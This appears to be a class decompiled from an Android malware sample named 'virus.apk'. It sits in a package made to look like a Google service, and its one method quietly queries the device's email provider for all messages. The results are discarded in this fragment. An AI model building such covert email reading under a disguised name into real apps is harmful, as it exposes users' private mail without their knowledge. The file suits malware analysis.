package com.example.google.service;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public class EMailHelper
{
  private Context mContext;

  public EMailHelper(Context paramContext)
  {
    this.mContext = paramContext;
  }

  public void ReadEmail()
  {
    Cursor localCursor = this.mContext.getContentResolver().query(Uri.parse("content://com.android.email.provider/message"), null, null, null, null);
    while ((localCursor != null) && (localCursor.moveToNext()));
  }
}

/* Location:           F:\SDK\dex2jar-0.0.9.15\virus.apk_dex2jar.jar
 * Qualified Name:     com.example.google.service.EMailHelper
 * JD-Core Version:    0.6.2
 */